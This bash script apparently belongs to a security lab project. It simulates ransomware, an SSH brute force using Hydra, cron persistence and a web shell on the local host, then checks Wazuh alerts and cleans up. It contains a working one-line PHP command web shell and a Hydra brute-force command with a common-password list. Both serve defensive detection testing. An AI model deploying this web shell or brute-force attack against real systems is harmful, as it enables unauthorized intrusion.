#!/bin/bash
# Sentient Shield - Week 4: Run All Threat Simulations
# Executes comprehensive threat simulation tests

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

LOG_FILE="/var/log/sentient-shield-week4-simulations.log"

print_status() {
    echo -e "${GREEN}[✓]${NC} $1" | tee -a "$LOG_FILE"
}

print_error() {
    echo -e "${RED}[✗]${NC} $1" | tee -a "$LOG_FILE"
}

print_warning() {
    echo -e "${YELLOW}[!]${NC} $1" | tee -a "$LOG_FILE"
}

print_info() {
    echo -e "${BLUE}[i]${NC} $1" | tee -a "$LOG_FILE"
}

# Check if running as root
if [ "$EUID" -ne 0 ]; then
    print_error "Please run as root (use sudo)"
    exit 1
fi

echo "=========================================="
echo "  Week 4: Threat Simulation Suite"
echo "=========================================="
echo ""
echo "$(date)" >> "$LOG_FILE"

# Simulation 1: Ransomware (T1486)
print_info "Simulation 1: Ransomware Attack (T1486)"
echo ""

# Create test directory
TEST_DIR="/tmp/atomic-test-files"
mkdir -p "$TEST_DIR"

# Create test files
print_status "Creating test files..."
for i in {1..10}; do
    echo "Test file $i - $(date)" > "$TEST_DIR/testfile$i.txt"
done

# Simulate ransomware encryption
print_status "Simulating file encryption..."
for file in "$TEST_DIR"/*.txt; do
    if [ -f "$file" ]; then
        print_info "  Encrypting: $(basename $file)"
        mv "$file" "${file}.encrypted"
        echo "ENCRYPTED_DATA_$(date +%s)" >> "${file}.encrypted"
        sleep 0.5
    fi
done

# Create ransom note
cat > "$TEST_DIR/RANSOM_NOTE.txt" << 'EOF'
╔═══════════════════════════════════════╗
║   YOUR FILES HAVE BEEN ENCRYPTED!    ║
╚═══════════════════════════════════════╝

All your important files have been encrypted with military-grade encryption.

To decrypt your files, you must pay 1 BTC to:
[Bitcoin Address Here]

This is a SIMULATION for testing purposes only.
No actual encryption has occurred.

Sentient Shield - Week 4 Testing
EOF

print_status "Ransom note created"
print_status "Ransomware simulation complete"
echo ""

# Wait for detection
print_info "Waiting 10 seconds for FIM detection..."
sleep 10

# Check detection
RANSOMWARE_ALERTS=$(grep -c "100205\|ransomware\|RANSOM_NOTE" /var/ossec/logs/alerts/alerts.log 2>/dev/null || echo "0")
if [ "$RANSOMWARE_ALERTS" -gt 0 ]; then
    print_status "Ransomware detected! ($RANSOMWARE_ALERTS alerts)"
else
    print_warning "Ransomware not detected yet (check FIM configuration)"
fi

echo ""

# Simulation 2: SSH Brute Force (T1110.001)
print_info "Simulation 2: SSH Brute Force Attack (T1110.001)"
echo ""

# Check if testuser exists
if ! id "testuser" &>/dev/null; then
    print_warning "Test user not found, creating..."
    useradd -m testuser
    echo "testuser:ComplexPassword123!" | chpasswd
fi

# Create password list
cat > /tmp/brute-passwords.txt << EOF
password
123456
admin
testuser
qwerty
letmein
welcome
monkey
dragon
master
EOF

print_status "Password list created"

# Check if hydra is installed
if ! command -v hydra &> /dev/null; then
    print_warning "Hydra not installed, installing..."
    apt-get update -qq
    apt-get install -y hydra
fi

# Get target IP
TARGET_IP=$(hostname -I | awk '{print $1}')

print_status "Launching SSH brute force attack..."
print_info "  Target: $TARGET_IP"
print_info "  User: testuser"
print_info "  Attempts: 10"

# Launch attack (will fail and trigger detection)
hydra -l testuser -P /tmp/brute-passwords.txt ssh://$TARGET_IP -t 4 -V 2>&1 | tee -a "$LOG_FILE" || true

print_status "Brute force attack completed"
echo ""

# Wait for detection and response
print_info "Waiting 15 seconds for detection and active response..."
sleep 15

# Check detection
BRUTE_FORCE_ALERTS=$(grep -c "100101" /var/ossec/logs/alerts/alerts.log 2>/dev/null || echo "0")
if [ "$BRUTE_FORCE_ALERTS" -gt 0 ]; then
    print_status "Brute force detected! ($BRUTE_FORCE_ALERTS alerts)"
else
    print_warning "Brute force not detected (check detection rules)"
fi

# Check if IP was blocked
if iptables -L INPUT -n | grep -q "$TARGET_IP"; then
    print_status "Active response triggered! IP blocked"
    print_warning "Unblocking localhost to prevent lockout..."
    /var/ossec/active-response/bin/firewall-drop.sh delete - "$TARGET_IP" - - 2>/dev/null || true
else
    print_warning "Active response not triggered (check configuration)"
fi

echo ""

# Simulation 3: Suspicious File Modifications (T1547)
print_info "Simulation 3: Persistence Mechanism (T1547)"
echo ""

# Simulate startup persistence
STARTUP_FILE="/tmp/test-startup.sh"
cat > "$STARTUP_FILE" << 'EOF'
#!/bin/bash
# Simulated persistence mechanism
echo "Startup script executed at $(date)" >> /tmp/startup.log
EOF

chmod +x "$STARTUP_FILE"
print_status "Startup persistence file created"

# Simulate adding to crontab (safe simulation)
echo "# Test cron entry - Sentient Shield Week 4" > /tmp/test-crontab
echo "@reboot $STARTUP_FILE" >> /tmp/test-crontab
print_status "Crontab entry simulated"

echo ""

# Wait for detection
print_info "Waiting 10 seconds for detection..."
sleep 10

PERSISTENCE_ALERTS=$(grep -c "100206\|startup\|persistence" /var/ossec/logs/alerts/alerts.log 2>/dev/null || echo "0")
if [ "$PERSISTENCE_ALERTS" -gt 0 ]; then
    print_status "Persistence mechanism detected! ($PERSISTENCE_ALERTS alerts)"
else
    print_warning "Persistence not detected (this is normal if rule threshold not met)"
fi

echo ""

# Simulation 4: Web Shell Detection (T1505.003)
print_info "Simulation 4: Web Shell Detection (T1505.003)"
echo ""

# Create simulated web shell
WEB_DIR="/tmp/www"
mkdir -p "$WEB_DIR"

cat > "$WEB_DIR/shell.php" << 'EOF'
<?php
// Simulated web shell for testing
// DO NOT USE IN PRODUCTION

if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}

echo "Web Shell - Test Only";
?>
EOF

print_status "Web shell file created"

# Wait for detection
print_info "Waiting 10 seconds for detection..."
sleep 10

WEBSHELL_ALERTS=$(grep -c "100203\|web.shell\|shell.php" /var/ossec/logs/alerts/alerts.log 2>/dev/null || echo "0")
if [ "$WEBSHELL_ALERTS" -gt 0 ]; then
    print_status "Web shell detected! ($WEBSHELL_ALERTS alerts)"
else
    print_warning "Web shell not detected (check FIM configuration)"
fi

echo ""

# Summary
echo "=========================================="
echo "  Simulation Summary"
echo "=========================================="
echo ""

print_info "Simulations Executed:"
echo "  1. ✓ Ransomware (T1486)"
echo "  2. ✓ SSH Brute Force (T1110.001)"
echo "  3. ✓ Persistence (T1547)"
echo "  4. ✓ Web Shell (T1505.003)"
echo ""

print_info "Detection Results:"
echo "  - Ransomware alerts: $RANSOMWARE_ALERTS"
echo "  - Brute force alerts: $BRUTE_FORCE_ALERTS"
echo "  - Persistence alerts: $PERSISTENCE_ALERTS"
echo "  - Web shell alerts: $WEBSHELL_ALERTS"
echo ""

# Calculate detection rate
TOTAL_SIMULATIONS=4
DETECTED=0

[ "$RANSOMWARE_ALERTS" -gt 0 ] && ((DETECTED++))
[ "$BRUTE_FORCE_ALERTS" -gt 0 ] && ((DETECTED++))
[ "$PERSISTENCE_ALERTS" -gt 0 ] && ((DETECTED++))
[ "$WEBSHELL_ALERTS" -gt 0 ] && ((DETECTED++))

DETECTION_RATE=$((DETECTED * 100 / TOTAL_SIMULATIONS))

print_info "Detection Rate: $DETECTION_RATE% ($DETECTED/$TOTAL_SIMULATIONS)"
echo ""

if [ "$DETECTION_RATE" -ge 75 ]; then
    print_status "Detection rate is acceptable (>= 75%)"
else
    print_warning "Detection rate is below target (< 75%)"
fi

echo ""
print_info "Next Steps:"
echo "  1. Review alerts: sudo tail -f /var/ossec/logs/alerts/alerts.log"
echo "  2. Check dashboard: https://$(hostname -I | awk '{print $1}'):443"
echo "  3. Validate detection: sudo bash scripts/week4-validate-detection.sh"
echo "  4. Generate report: sudo bash scripts/week4-generate-report.sh"
echo ""

print_status "Simulation log saved to: $LOG_FILE"
echo ""

# Cleanup
print_info "Cleaning up test files..."
rm -rf "$TEST_DIR" 2>/dev/null || true
rm -f /tmp/brute-passwords.txt 2>/dev/null || true
rm -f "$STARTUP_FILE" 2>/dev/null || true
rm -f /tmp/test-crontab 2>/dev/null || true
rm -rf "$WEB_DIR" 2>/dev/null || true

print_status "Cleanup complete"
echo ""

exit 0
